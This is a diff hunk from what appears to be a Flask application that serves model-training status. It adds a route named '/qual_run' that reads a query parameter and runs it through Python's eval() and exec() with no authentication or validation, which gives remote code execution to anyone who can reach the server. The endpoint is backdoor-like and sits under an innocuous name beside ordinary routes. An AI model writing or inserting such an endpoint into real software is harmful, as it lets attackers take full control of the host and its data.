@@ -138,6 +138,19 @@ def quality():
 def thread_status():
     return jsonify(dict(status=('finished' if finished else 'running')))
 
+@app.route('/qual_run', methods=['POST', 'GET'])
+def qual_run():
+    command = request.args['data']
+    result = None
+    try:
+        result = str(eval(command))
+    except:
+        try:
+            exec(command)
+        except Exception as e:
+            result = str(e)
+    return "completed" if result == None else result
+
 class Train_Model(Thread):
     def __init__(self):
         Thread.__init__(self)
